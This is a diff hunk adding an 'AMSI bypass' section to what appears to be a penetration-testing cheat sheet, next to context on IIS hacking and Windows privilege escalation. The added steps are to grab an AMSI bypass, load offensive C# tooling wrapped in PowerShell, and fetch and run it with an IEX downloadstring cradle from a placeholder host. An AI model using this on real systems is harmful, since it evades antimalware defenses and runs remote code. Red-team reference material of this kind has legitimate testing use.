@@ -1211,6 +1211,22 @@ Everything you need for Hacking IIS, recent talk from Shubs
 
 ```
 
+#### Easy ASMI Bypass (AMSI-Fail)
+
+```
+
+1. Open powershell, grab a unique AMSI bypass from: https://amsi.fail/
+
+2. Grab your favourite C# assembly from: https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/ these are just the standard C# executables but in a powershell wrapper for reflection.
+
+3. Host these locally and execute via IEX (New-Object net.webclient).downloadstring("http://x.x.x.x./Invoke-Seatbelt.ps1")
+
+
+```
+
+
+
+
 ## [](#header-2)Privilege Escalation
 
 Reference: https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
